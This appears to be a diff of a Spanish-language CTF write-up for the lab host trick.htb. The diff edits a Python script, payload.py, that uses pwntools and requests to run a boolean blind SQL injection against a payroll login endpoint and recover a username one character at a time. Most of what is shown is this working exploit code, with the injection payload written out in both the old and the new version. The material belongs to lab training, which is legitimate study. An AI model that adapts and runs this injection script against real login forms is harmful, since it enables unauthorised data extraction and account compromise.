@@ -30,8 +30,6 @@ pip3 install pwntools requests --break-system-packages
 Puedes copiar este bloque de código directamente y guardarlo en tu máquina como `payload.py`:
 
 ```python
-#!/usr/bin/env python3
-
 import requests
 import string
 import sys
@@ -39,7 +37,6 @@ import time
 import signal
 from pwn import *
 
-# Configuración del manejador para salir limpiamente con Ctrl+C
 def def_handler(sig, frame):
     print("\n\n[!] Saliendo...\n")
     sys.exit(1)
@@ -47,44 +44,38 @@ def def_handler(sig, frame):
 signal.signal(signal.SIGINT, def_handler)
 
 # Variables globales
-login_url = "[http://preprod-payroll.trick.htb/ajax.php?action=login](http://preprod-payroll.trick.htb/ajax.php?action=login)"
+login_url = "http://preprod-payroll.trick.htb/ajax.php?action=login"
 characters = string.ascii_lowercase + "-_"
 
 def makeRequest():
+
     p1 = log.progress("Fuerza bruta")
     p1.status("Iniciando proceso de fuerza bruta")
-    
+
     time.sleep(2)
+
     username = ""
+
     p2 = log.progress("Usuario")
-    
-    # Bucle para recorrer posición por posición (hasta 20 caracteres)
+
     for position in range(1, 20):
-        for character in range(len(characters)):
-            current_char = characters[character]
-            
-            # Formateamos el payload inyectando la posición y el carácter actual
-            payload = "' or (select substring(username,%d,1) from users limit 1)='%s'-- -" % (position, current_char)
-            
+        for character in characters:
             post_data = {
-                'username': payload,
+                'username': "' or (select substring(username,%d,1) from users limit 1)='%s'-- -" % (position, character),
                 'password': 'test'
             }
-            
+
             p1.status(post_data['username'])
-            
-            # Realizamos la petición POST al servidor
+
             r = requests.post(login_url, data=post_data)
-            
-            # Si el servidor responde "1", significa que la condición es verdadera (True)
+
             if r.text == "1":
-                username += current_char
+                username += character
                 p2.status(username)
                 break
 
 if __name__ == '__main__':
     makeRequest()
-
 ```
 
 ---
